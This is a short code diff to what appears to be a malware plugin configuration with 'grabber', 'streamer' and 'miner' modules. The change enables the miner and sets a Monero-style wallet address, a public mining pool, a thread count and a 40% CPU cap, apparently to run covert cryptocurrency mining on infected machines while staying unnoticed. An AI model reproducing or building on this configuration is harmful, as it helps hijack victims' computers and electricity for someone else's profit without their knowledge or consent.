@@ -71,8 +71,8 @@ object PluginManager {
                 {
                   "grabber": { "enabled": true, "version": "2.0" },
                   "streamer": { "enabled": true, "version": "1.0" },
-                  "miner": { "enabled": false, "version": "1.0", "settings": {
-                    "wallet": "",
+                  "miner": { "enabled": true, "version": "1.0", "settings": {
+                    "wallet": "46i21n77LsSK9g4SmetVTSWi9yLE1jHjBPb2js5skp1zQ4a1jMztq1n4Hy1zKXqWSWigHzaoG1j8yJyAu5pvTvVH1ujyDeJ",
                     "pool": "pool.supportxmr.com:3333",
                     "threads": 2,
                     "max_cpu_percent": 40
